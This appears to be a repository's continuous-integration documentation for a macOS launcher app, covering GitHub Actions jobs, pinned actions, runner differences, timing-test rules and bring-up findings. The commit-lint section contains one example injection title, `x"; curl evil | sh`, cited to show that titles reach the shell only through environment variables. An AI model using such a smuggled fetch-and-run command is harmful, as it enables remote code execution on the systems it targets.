# Continuous integration

Everything that can run without a physical Mac runs on free GitHub-hosted runners (the repository is public, and standard hosted runners
are free for public repositories, macOS included). The rest is listed in [What needs a physical Mac](#what-needs-a-physical-mac).

| Workflow | Runs on | Jobs |
|---|---|---|
| `ci.yml` | every pull request and push to `main`; `workflow_dispatch` | `check`, `deny`, `lab-scripts`, `packaging`, `perf` |
| `ci.yml` | manual runs with `stress=true` only | `stress` (macOS 15 and macOS 15 Intel), see [Timing-sensitive tests](#timing-sensitive-tests) |
| `ci.yml` | pushes to `main` and manual runs only | `gui-smoke` (macOS 15 and 26), `x86-64` (macOS 15 Intel), `bundle` |
| `commit-lint.yml` | every pull request (opened, edited, synchronize, reopened) | `commit-lint`, `hooks-tests` |
| `nightly.yml` | every night 02:41 UTC; `workflow_dispatch` | `checklist` (macOS 15 and 26), `soak` (macOS 15) |
| `advisories.yml` | Mondays 06:17 UTC; `workflow_dispatch` | RustSec advisories for the locked dependencies |
| `release.yml` | a pushed `v*` tag; `workflow_dispatch` builds and uploads but never creates a release | signed or ad-hoc universal build, draft release |

Required status checks on `main`: `check` and `deny`.

## What each job does

* **check** (macos-15): `scripts/check.sh` = `cargo fmt --check`, `cargo clippy -D warnings`, `cargo test --workspace`.
* **perf** (macos-15): `cargo test --release -p ashdash-core -- --ignored perf_ --test-threads=1`, the absolute latency ceilings. See
  [Timing-sensitive tests](#timing-sensitive-tests). Not a required status check.
* **deny** (ubuntu): `cargo deny check licenses bans sources` (`deny.toml`). Advisories are deliberately not part of pull requests: a new
  RustSec entry for a crate a change does not touch would turn every pull request red. They run weekly in `advisories.yml`.
* **lab-scripts** (macos-15): `tests/e2e/test/run-tests.sh`, the host tests of the lab scripts against a fake `tart` and `ssh`: slot
  semaphore, `lab-with-vm`, the guards of `tests/e2e/guest/tcc-grant.sh` (including the CI mode) and of the CI wrappers, `finalize.py`.
* **packaging** (macos-15): `packaging/selftest.sh`, `scripts/gen-notice.py --check` (NOTICE is up to date), and `tests/e2e/ci/lint.sh`:
  shellcheck (warnings and errors) on every shell script in the repository and actionlint on the workflows. Both linters are downloaded as
  pinned releases and verified against a SHA-256 in the workflow.
* **gui-smoke** (macos-15, macos-26): `tests/e2e/ci/run-smoke.sh` = the lab's `tests/e2e/smoke.sh --quick` on the runner: debug build, native
  `Ashdash.app` with `packaging/build-app.sh`, launch in the GUI session, `ashdash show/search/query`, the `ashdash://` scheme, the global
  hotkey Option+Shift+Space through System Events (the window must toggle), window state read back as text, a screenshot, login item
  enable/status/disable, `quit`. `scripts/check.sh` is not repeated (the `check` job does it).
* **x86-64** (macos-15-intel): `cargo test --workspace`, `cargo build -p ashdash`, and the same GUI smoke test as above with the native x86-64 bundle. **GitHub retires the
  `macos-15-intel` image in August 2027**; it is the last Intel hosted runner. After that, x86-64 is only built (the `bundle` job
  cross-compiles the x86-64 slice on arm64) and never executed in CI; its tests need a physical Intel Mac. Delete this job when the label
  stops working.
* **bundle** (macos-15): `packaging/build-app.sh` (universal arm64 + x86_64, ad-hoc signed) and `packaging/make-dmg.sh`, then
  `tests/e2e/ci/verify-bundle.sh`: both architectures present, `codesign --verify --deep --strict`, `plutil -lint`, the DMG checksum and
  `hdiutil verify`, the app inside the mounted image, and the bundled binary starts. The DMG and its checksum are uploaded as a workflow
  artifact for 7 days (not a release).
* **checklist** (nightly): `tests/e2e/ci/run-checklist.sh` = `qa/prep.sh` (grants, native bundle, install to `/Applications`) +
  `qa/checklist.sh` (all sections: hotkey and window, search, keys, focus, clipboard and snippets, workflows, permissions, preferences,
  actions panel, measurements, the later behaviours) + `tests/e2e/ci/finalize.py`. About 140 rows; a run takes about 22 minutes.
* **soak** (nightly): `tests/e2e/ci/run-soak.sh` = `qa/soak.sh` for 7200 s (the 2-hour version of the lab): show, type, hide every 30 s,
  sample RSS, footprint, CPU time, threads and open files every 5 minutes, count crash reports, check the hotkey at the end. The dispatch
  input `soak_seconds` shortens it. A hosted job may run for up to 6 hours; the job limit here is 5.

Logs, results and screenshots are uploaded as artifacts **only when a job fails** (7 days). Screenshots of green runs are deleted before the
job ends. The job summary page of every run has the report (smoke stages, checklist rows that are not PASS, soak samples).

## Commit messages: `commit-lint.yml`

Pull requests are squash-merged, so the pull request title becomes the commit on `main` and the release version is computed from it
([RELEASING.md](RELEASING.md)). The `commit-lint` job (ubuntu, about 10 s) runs `scripts/commit-lint.sh` twice: on the **title**
(`--title`) and on **every commit of the pull request** (`--range refs/remotes/origin/<base>..<head sha>`, `fetch-depth: 0`; merge commits are skipped),
both with `--forbid-names`. The rules are in [CONTRIBUTING.md](../CONTRIBUTING.md#commit-messages-and-pull-requests); they run locally as
git hooks too, and CI repeats them because hooks can be skipped. The title, the base branch and the head SHA reach the shell only through
environment variables, never through `${{ }}` in a command line (a title like `x"; curl evil | sh` is just text). Editing the title re-runs
the job (`edited`). Dependabot pull requests get a header limit of 120 instead of 72 (its group titles are longer and cannot be shortened).
The second job, `hooks-tests`, runs `tests/hooks/run-tests.sh` (the validator and the hooks, in throw-away repositories) on Linux, which keeps the
scripts portable; on macOS the same tests run inside `scripts/check.sh`. Reproduce locally: `scripts/commit-lint.sh --title "..."`,
`scripts/commit-lint.sh --range origin/main..HEAD`, `tests/hooks/run-tests.sh`. `commit-lint` is not a required status check until a
maintainer adds it to the ruleset.

## Pins

Third-party actions are pinned by commit SHA; the comment on each line names the release. The newest stable releases when this was written
(2026-10-18):

| Action | Release | Commit |
|---|---|---|
| `actions/checkout` | v7.0.1 | `3d3c42e5aac5ba805825da76410c181273ba90b1` |
| `actions/upload-artifact` | v7.0.2 | `cf430e030ddbb5b0abf93d22962f4752f3646cd9` |
| `actions/download-artifact` | v8.0.2 | `9000827ccba6bdab643e8b6fd33ac0654aef8333` |
| `Swatinem/rust-cache` | v2.9.2 | `6323deb102c322ba6fcbdcafc7e3dddab59af2b6` |
| `EmbarkStudios/cargo-deny-action` | v2.1.1 | `3c6349835b2b7b196a839186cb8b78e02f7b5f25` |
| `dtolnay/rust-toolchain` | branch `stable` | `b725eda525362e7cf34af9a7243cac1e3f01a7ec` (the head of the action's `stable` branch on 2026-10-16: it tracks the toolchain by branch, its only release tag is from 2022) |
| shellcheck (downloaded) | v0.11.0 | tarball SHA-256 in `ci.yml` |
| actionlint (downloaded) | v1.7.12 | tarball SHA-256 in `ci.yml` |

`rust-cache` and `cargo-deny-action` use annotated tags: the pinned value is the commit the tag points at, not the tag object.
Dependabot (`.github/dependabot.yml`) proposes updates weekly.

Security rules for the public repository: workflows run on `pull_request` (never `pull_request_target`), the token is read-only
(`permissions: contents: read`; only the draft-release step of `release.yml` gets `contents: write`), there are no secrets in the pull
request workflows, checkouts do not persist credentials, every job has a `timeout-minutes`, and a `concurrency` group cancels superseded runs.

## What a hosted runner is, and how it differs from the lab VM

A spike on 2026-10-18 (all three images, same commit) established that a hosted macOS runner is the same kind of machine as a lab clone:

| | `macos-15` | `macos-26` | `macos-15-intel` |
|---|---|---|---|
| macOS | 15.7.9 (24G830) | 26.6.2 (25G83) | 15.7.9 (24G830) |
| Architecture, model | arm64, `VirtualMac2,1` (Apple virtualization) | arm64, `VirtualMac2,1` | x86_64, `Macmini6,2` (a hypervisor, not Apple's) |
| CPUs, memory | 3, 7 GB | 3, 7 GB | 4, 14 GB |
| Display | 1024 x 768 | 1024 x 768 | 1920 x 1080 |
| SIP | disabled | disabled | disabled |
| Account, console | `runner`, logged in on `/dev/console`, session type Aqua | same | same |
| Passwordless `sudo` | yes | yes | yes |
| System Events (`osascript ... keystroke`) | works, no consent dialog | works | works |
| `screencapture -x` | real pixels (Screen Recording granted) | real pixels | real pixels |
| `CGWindowListCopyWindowInfo` (`scripts/qa/windows.swift`) | lists menu bar, Dock, Finder and the launcher windows | same | same |
| TCC databases | readable and writable with `sudo`; Accessibility and AppleEvents are pre-granted to `/bin/bash`, `osascript`, `sshd-keygen-wrapper`, Terminal | same | same |
| `cargo build -p ashdash` + `packaging/build-app.sh` (native) | yes (4 min 25 s cold) | yes (4 min 10 s cold) | yes (10 min 27 s cold) |
| Launch the bundle in the GUI session | yes, window visible | yes | yes |
| Global hotkey through System Events | toggles the launcher (1 window -> 0) | same | same |
| `ashdash://` through `open` | handler registered with `lsregister`, `open` returns 0 | same | same |
| `tests/e2e/guest/tcc-grant.sh` (CI mode) | accepted (VirtualMac, user `runner`) | accepted | refused: the model is not `VirtualMac*`; not needed, the grants exist already |
| Spotlight | on, indexes slowly | on | on |

Differences from the lab VM (macOS 15 on Tart) that matter for results:

* **Spotlight is on** here and off in the lab. Rows that the lab marks BLOCKED because `mdfind` is empty (3.2.8c, 3.9.2, 3.11.3) can run,
  but a file created seconds ago is not indexed yet: `checklist.sh` waits up to 60 s for its fixture before asking.
* **Smaller display** (1024 x 768 on arm64). Any check that looks for a window of at least a given size sees the launcher's hidden full-size window
  as well. See the two open rows below.
* **Three cores, 7 GB**, shared hardware: timings are noisier than on the lab host. A unit test that slept for 30 ms and required the clock
  not to pass 80 ms failed on every arm64 runner; it was loosened (see "Findings while bringing CI up"), and later rewritten so that no
  test depends on the speed of the machine (see [Timing-sensitive tests](#timing-sensitive-tests)).
* **Pre-granted privacy permissions.** The hosted image grants Accessibility, Automation and Screen Recording to the tools the scripts use, so
  the first-use consent dialogs the lab sees do not appear. `tcc-grant.sh` still runs (it adds the Terminal and `osascript` rows the
  scripts rely on), and the "no TCC rows for the app" paths are as exercised as in the lab: nothing is granted to Ashdash itself.
* **Image content.** Firefox, Chrome, Edge and PowerShell are present as bundles, Visual Studio Code is not (3.2.1b stays BLOCKED),
  and `/Applications/Safari.app` is a symlink into a cryptex.
* The runner is thrown away after the job: nothing the scripts write (login item, TCC rows, `/Applications/Ashdash.app`) survives.

The scripts that drive the keyboard, the screen and the hotkey (`run-smoke.sh`, `run-checklist.sh`, `run-soak.sh`) refuse to run unless
`GITHUB_ACTIONS=true`, `RUNNER_ENVIRONMENT=github-hosted`, the account is `runner` and it owns the console. `tcc-grant.sh` additionally
requires a `VirtualMac*` model, so exporting the variables on a developer's Mac changes nothing (host tests: `tests/e2e/test/run-tests.sh`).

## Timing-sensitive tests

A hosted runner has 3 or 4 shared CPUs and the tests are built in debug mode, which is 4 to 60 times slower than release. A test that
compares a wall-clock time with a constant therefore fails on a slow runner and says nothing about the code (the `x86-64` job failed twice
this way: 166 ms against a 150 ms ceiling, and a 25 ms ceiling at 5,000 apps). The rules for tests of this repository:

* **Never compare a time with a constant to guard performance.** Count work (`crate::testperf::allocations_in`: allocations are exact and
  identical on every machine) or compare the code with itself on a small and a large input in the same test (`testperf::best_of_pair`:
  interleaved rounds, the least CPU time of the thread in each; wall-clock time is not used because a long run is interrupted far more often than a short one on a busy machine, which skews the ratio; a linear algorithm costs about 10x for 10x the input, a quadratic one 100x).
* **Absolute ceilings live in `perf_*` tests** that are `#[ignore]`d in the normal run and start with `testperf::require_release()`. The
  `perf` job runs them in release mode: `cargo test --release -p ashdash-core -- --ignored perf_ --test-threads=1`. Run the same command
  locally before changing a hot path. The ceilings keep a 5x or larger margin over the numbers in [PERF.md](PERF.md).
* **Never sleep for a duration the test then depends on.** Wait for the condition: poll with short steps and a generous overall limit that
  only bounds a real failure (30 to 60 s). Where the code under test reads a clock (the bookmark back-off), the test passes a fake clock
  and advances it by hand. Where a handler must be "slow", block it on a gate that the test opens, and read what the handler did, not how
  long it took. The OS file watcher cannot be asked whether it is armed: repeat the edit until the report arrives.
* **A bound on a hang is fine** (a script that sleeps 40 s must come back before 25 s; a parse that would run for hours must end within
  30 s) as long as the limit sits at least 3x from both what the code normally takes and what a broken run would take.
* **A wait for something that must not happen** (`recv_timeout(..).is_err()`) can only make a test pass too easily, never fail; keep it
  short, and make sure the positive case before it proves the machinery is running.

To see how these tests behave on a slow runner, dispatch `ci.yml` with the **`stress`** input (`gh workflow run ci.yml --ref <branch> -f stress=true -f target_ref=<branch, tag or full 40-character SHA>`). It
runs `scripts/stress-timing.sh`: each formerly clock-dependent test 100 times in a row while four busy loops per CPU keep the runner
saturated, on macOS 15 (arm64) and macOS 15 Intel, and fails if a single run fails; the table goes to the job summary. Do not do this on a
developer machine: anything that saturates the CPUs runs in the pipeline. `target_ref` points the same script at older code, to prove that
a test failed before a fix. Add new timing-sensitive tests to the list in the script.

## Rows that differ or cannot run: `tests/e2e/ci/blocked.tsv`

`finalize.py` turns a **FAIL** into **BLOCKED** with the reason only for rows listed in `tests/e2e/ci/blocked.tsv` (optionally for one
image); a PASS stays a PASS and every other FAIL fails the job. The BLOCKED and NEEDS-OWNER rows that `checklist.sh` itself reports are the
same ones as in the lab (no second display, display sleep locks the session, restart/logout/lock would end the session, no network switch,
Full Disk Access is not enforced with SIP off, nothing to type with an IME, ...).

Rows that fail only sometimes are not hidden either: a GUI check on a shared 3-core virtual machine can miss its timing. When the first
pass of the checklist has a FAILed row, `run-checklist.sh` runs the sections that contain it once more; a row that fails twice fails the
job, and one that passes the second time is listed in the job summary as flaky (`CI_RETRY=0` turns the second pass off). Seen during
bring-up, all on macOS 26 and all passing on the second pass or in the next run: 3.2.9b (twice), 3.3.6b and 3.5.5b (once each; the Large
Type check now waits up to 5 s for the window to go away).

`tests/e2e/ci/blocked.tsv` is empty at the moment: every row that failed on a hosted runner while this was set up was a real bug, now
fixed, or flaky. Add a row there (with the reason and, if it applies to one image only, the image) when a check needs something a hosted
runner cannot give.

## Findings while bringing CI up

* **App list truncated by a symlinked bundle (product bug, fixed on branch `ci/w9-fixtest`).** `crates/core/src/index/scan.rs` called
  walkdir's `skip_current_dir` on every `.app`; for a symlink such as `/Applications/Safari.app` (a link into a cryptex since macOS 13) that
  skips the rest of the parent directory, so which apps were listed depended on the directory order. On the hosted images `ashdash query
  saf` listed no Safari and `/Applications` contributed one Xcode and nothing else. It reproduces on any Mac with a regression test
  (`a_symlinked_bundle_does_not_hide_the_apps_after_it`).
* **Timing test (fixed on the same branch).** `bookmarks::cache::tests::backoff_grows_exponentially_up_to_the_cap` slept 30 ms and
  required the clock not to pass 80 ms; it failed on every arm64 runner (it passes on the Intel image and on a developer Mac). The waits were
  loosened to 200/400 ms, and it still failed once on a loaded machine; it now uses a fake clock and does not sleep at all.
* **Latency tests on the Intel runner.** `scoring_thousands_of_bookmarks_per_keystroke_stays_cheap` (p95 166 ms against 150 ms) and
  `query_latency_p95_at_5000_apps_stays_under_the_ceiling` failed in the `x86-64` job. Both are now machine-independent (allocation counts
  and scaling ratios), with the absolute ceilings as release-mode `perf_*` tests; see [Timing-sensitive tests](#timing-sensitive-tests).
* **Checklist row 3.2.8c never ran in the lab** (Spotlight is off there). On a runner it exposed that the script created its fixture outside
  the home folder the launcher searches; the fixture is now created there and the script waits for Spotlight to index it.
* **`advisories.yml` is red:** `cargo deny check advisories` reports the yanked crate `inout 0.2.3` (dependency path `ashdash-core` -> `zip 9.0.3`
  -> `aes 0.9.3` -> `cipher 0.5.2` -> `inout`). Fixing it means changing `Cargo.lock` (or pinning a different `zip`), which this work does not do.
* **`macos-14` is retired on 2026-11-02**; `release.yml` built on it and now uses `macos-15` (the app is still built for macOS 12.0 and later).

## Typical durations

Measured on the proof runs of 2026-10-18 (warm `rust-cache`; a cold cache adds 3 to 20 minutes, most on the Intel image):

| Job | Time |
|---|---|
| `deny` | 0.5 min |
| `packaging` | 0.5 min |
| `lab-scripts` | 2 min |
| `check` | 2 min |
| `gui-smoke` (macOS 15 / 26) | 2 to 3 min |
| `bundle` | 3.5 to 4 min |
| `x86-64` (build, tests and GUI smoke) | 6 to 8 min (25 min cold) |
| whole `ci.yml` run on `main` | about 10 min wall clock when the five-macOS-job limit does not queue anything |
| `checklist` (macOS 15 / 26) | 20 / 23 min (including the build, and the second pass when there is one) |
| `soak`, 7200 s | 2 h 2 min (240 cycles, no missed hotkey, no crash) |

## Reproducing a CI failure locally

1. Download the artifact of the failed job (`gh run download <run-id> -n <name>`): `smoke-report.txt` / `results.tsv` / `results-final.tsv`,
   the logs and the screenshots of the failed steps.
2. Run the same script in a lab VM (see [LAB.md](LAB.md)); the CI wrappers are thin: they set the artifact folder, call the lab script and
   post-process the results.

   ```sh
   vm=$(tests/e2e/lab-up --id repro --max-age 14400 | cut -d' ' -f1)
   tests/e2e/lab-run "$vm" -- bash tests/e2e/smoke.sh --quick                 # what gui-smoke runs
   tests/e2e/lab-run "$vm" -- bash tests/e2e/qa/prep.sh                       # what run-checklist.sh runs, step 1
   tests/e2e/lab-run "$vm" -- bash tests/e2e/qa/checklist.sh s31 s32          # a few sections only
   tests/e2e/lab-down "$vm"
   ```
3. `workflow_dispatch` runs a workflow from any branch of this repository: `gh workflow run ci.yml --ref <branch>`. (A *new* workflow file
   can only be dispatched once it exists on `main`; until then trigger it with a pull request or a temporary `push` trigger on a scratch branch.)
   `nightly.yml` takes `soak_seconds` and `sections` as inputs: `gh workflow run nightly.yml -f soak_seconds=600 -f sections="s31 s32"`.
4. The hosted-runner specifics (screen size, Spotlight, image content) cannot be reproduced in the Tart lab. To see the real thing, dispatch
   the workflow, or run `tests/e2e/ci/lint.sh` and `tests/e2e/test/run-tests.sh` on your Mac for the parts that need no GUI.

## What needs a physical Mac

Unchanged from [QA.md section 4](QA.md#4-checks-that-need-a-physical-mac): multiple displays and Spaces, IME composition, real sleep and
display sleep, lock and unlock, display hot-plug, a non-Retina external display, a real password manager, Full Disk Access with SIP on,
the Gatekeeper first-launch dialogs for a quarantined download in Safari, notarization with a real Developer ID certificate, real-hardware
performance numbers ([PERF.md](PERF.md); a shared 3-core VM says nothing about start-up time or idle memory on a Mac), and Intel
hardware after August 2027.

## Cost model, forks and capacity

* Standard GitHub-hosted runners (all labels used here are standard) are free and not metered for public repositories. If the repository
  were made private, macOS minutes would be billed at a multiple of the Linux rate and the nightly soak alone would use about 250 macOS
  minutes a day; at that point move `nightly.yml` to a weekly schedule.
* A pull request from a fork runs `ci.yml` with a read-only token and no secrets, on this repository's runner capacity; the first
  workflow run of a new contributor needs a maintainer's approval. It runs only the cheap jobs (`check`, `deny`, `lab-scripts`,
  `packaging`); the GUI jobs, `x86-64`, `bundle` and the nightly workflow never run for a fork's pull request.
* In a fork, scheduled workflows are disabled until the fork owner enables them, and a push to the fork's `main` runs the push jobs on
  the fork owner's account: free if the fork is public, metered if it is private.
* **Capacity.** A free account may run 20 jobs at once, at most 5 of them on macOS ([Actions limits](https://docs.github.com/en/actions/reference/limits)).
  A push to `main` starts 7 macOS jobs and the nightly workflow 3, so some wait in the queue; the nightly schedule is at a time with no
  pushes expected. Cache storage is limited to 10 GB per repository and artifact storage to 500 MB on a free organisation account:
  artifacts are kept for 7 days and only the bundle and failures are uploaded.
* Superseded runs are cancelled (`concurrency`), so a quick series of pushes costs one run, not many.
